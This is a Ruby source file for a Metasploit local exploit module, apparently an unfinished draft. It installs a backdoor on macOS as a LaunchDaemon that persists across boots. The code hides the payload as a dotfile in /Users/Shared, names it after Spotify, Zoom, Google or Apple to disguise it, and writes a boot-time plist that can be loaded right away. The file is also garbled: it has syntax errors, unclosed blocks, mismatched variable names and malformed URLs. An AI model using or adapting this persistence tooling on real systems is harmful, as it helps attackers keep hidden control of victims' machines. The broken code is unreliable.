##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
	include Msf::Post::File

	def initialize(info = {})
		super(
			update_info(
				info, 
				'Name' => 'OSX Launch Daemon Payload Installer',
				'Description' => %q{
					This module provides persistence by installing a payload
					as a Launch Daemon into the /Library/LaunchDaemons/ Directory.
					The payload will be launched before user login at system initialization.
					Unlike Launch Agents the Daemon operates outside of the context 
					of the users session at the system level. 
				},
				'License' => MSF_LICENSE,
				'References'  => [
					# OSX Malware Persistence, thanks Patrick
          			[ 'URL', 'https://taomm.org/vol1/pdfs/CH%202%20Persistence.pdf' ],
          			# Apples official Launch Agent & Launch Daemon docs
          			['URL', 'https://https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html']
         		],
        		'Author' =>  "gardnerapp AKA MewSashi",
        		'Targets' => "OSX", #TODO validate on ARM and x86
        		'SessionTypes' => [ 'shell', 'meterpreter' ]
			)
		)
	end 

	register_options([
		OpString,.new("BACKDOOR_PATH",[
			false, "Path to the backdoor, will be set to /Users/Shared/ as default ", 
			"/Users/Shared/"
		]),
		OptString.new("DAEMON_FILE",[
			true, 'Name of launch daemon plist',
			'com.evil.backdoor.plist'
		]),
		OptBool.new('RUN_NOW',[
			false, 'When set to true the daemon will run as soon as it is 
			loaded. If false it will run the next time launcd boots.', 
			false
		]),
	])

	def exploit
		check_duplicate_daemon

		write_backdoor
	end 

	# raises an error if the launch daemon file already exists
	def check_duplicate_daemon
		fail_with('FileError', "A Launch Daemon #{daemon_path} already exists." ) if file?(daemon_path)
	end 

	# Full path to Launch Daemon 
	def daemon
		@daemon_path = "/Library/LaunchDaemons/#{daemon_file}"
	end 

	# ensures user didn't forget the .plist extension
	def daemon_file
		if datastore['DAEMON_FILE'].ends_with?(".plist")
			@daemon_file = datastore['DAEMON_FILE'] 
		else 
			@daemon_path = datastore['DAEMON_FILE'].concat(".plist")
		# if the backdoor supplied by the user doesn't exist on the system fail
		if backdoor_supplied?
			fail_with(Failure::NotFound, 
				"The path to the supplied backdoor #{bckdr_pth} does not exist. Please provide the full path, and check the files existence/permissions. ")
		end 

		# check if the daemon plist file in /Library/LaunchDaemons doesn't already exist
		if daemon_plist_available?
			print_status("Your Daemon name is #{@daemon_plist} and will be stored in /Library/LaunchDaemons.")
		else
			fail_with(Failure::BadConfig, 
				"The LaunchDaemon file #{@daemon_plist} already
				 exists in /Library/LaunchDaemons. Please use a different name for your daemon choose name for your Daemon." )
		end

		# rename and move the backdoor
		create_daemon_backdoor

		# add the plist file to /Library/LaunchDaemons/
		create_daemon_plist

		# print the removal paths
		removal_details
	end

	def backdoor_supplied?
		file?(bckdr_pth) ? true : false
	end

	# The path to the backdoor which the user has on the system.
	def bckdr_pth
		@bckdr_pth = datastore["BACKDOOR_PATH"]
	end

	# returns true if the selected .plist file is available in /Library/LaunchDaemons
	def daemon_plist_available?
		f = "/Library/LaunchDaemons/#{daemon_plist}"
		file?(f) true : false
	end

	# name of the Launch Daemon file to be stored in /Library/LaunchDaemons
	def daemon_plist
		daemon_name
		names = %w[
			security updates analytics important 
			networking monitoring provisioning troubleshooting
		]
		@daemon_plist = "com.#{@daemon_name}.#{rand(names.length-1)}.plist"
	end

	# set the daemons name
	def daemon_name
		case datastore["DAEMON_NAME"]
		when 0
			@daemon_name = 'msfbackdoor'
		when 1
			@daemon_name = 'spotify'
		when 2 
			@daemon_name = 'zoom'
		when 3
			@daemon_name = 'google'
		when 4
			@daemon_name = 'apple'
		when 5
			@daemon_name = gets('please enter a custom daemon name')
		else 
			fail_with(Failure::BadConfig, 
				"Invalid value #{datastore["DAEMON_NAME"]} provided for 
				DAEMON_NAME.")
		end
		@daemon_name
	end

	# renames the backdoor to reflect the spoofed service by the LaunchDaemon. 
	# Moves it into the /Users/Shared directory as a hidden file. 
	def create_daemon_backdoor
		# copy over the backdoor, make it executable and remove the original
		daemon_door = daemon_bckdr_pth
		print_status("copying #{@bckdr_pth} into #{@daemon_bckdr_pth}")

		cmd_exec("cp #{@bckdr_pth} #{@daemon_bckdr_pth}")
		cmd_exec("chmod +x #{@daemon_bckdr_pth}")

		print_status("Removing original backdoor")
		cmd_exec("rm #{@bckdr_pth}")
	end

	# Reflect theme of spoofed daemon, user proper file extension
	def daemon_bckdr_pth
		@daemon_bckdr_pth = "/Users/Shared/.#{daemon_name}.#{bckdr_pth.split[-1]}"
	end

	# creates the LaunchDaemon plist file which will ultimatly trigger the backdoor upon boot
	def create_daemon_plist
		label = @daemon_plist.delete_suffix(".plist")
		
		plist_path = "/Library/LaunchDaemons/#{@daemon_plist}"

		# OnDemand was deprecated in OSX 10.4 but is kept her for backwards
		# compatibility, it was replaced with the KeepAlive key
		list = <<-EOI
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.appple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
			<dict>
				<key>Label</key>
				<string>#{label}</string>
				<key>ProgramArguments</key>
				<array>
					<string>#{@daemon_bckdr_pth}</string>
				</array>
				<key>RunAtLoad</key>
				<true/>
				<key>OnDemand</key>
				<true/>
				<key>KeepAlive</key>
				<true/>
			</dict>
		</plist>
		EOI

		if write_file(plist_path, list)
			print_good("plist successfuly written to #{plist_path}")
		else 
			fail_with(Failure::UnexpectedReply,
			 "Error writing Launch Daemon to #{plist_path}")
		end

		# The user wants to run the daemon right away
		if datastore["RUN_NOW"]
			print_status("Running the launch daemon.")
			cmd_exec("launchctl load -w #{plist_path}")
		end
	end

	def removal_details
		# remove the launch daemon file
		daemon_remove = "\nrm /Library/LaunchDaemons/#{@daemon_plist}\n"

		# remove the executable
		executable_remove = "\nrm #{@daemon_bckdr_pth}\n"

		print_status("To remove the Launch Daemon plist run: #{daemon_remove}")

		print_status("To remove the executable run: #{executable_remove}")
	end
end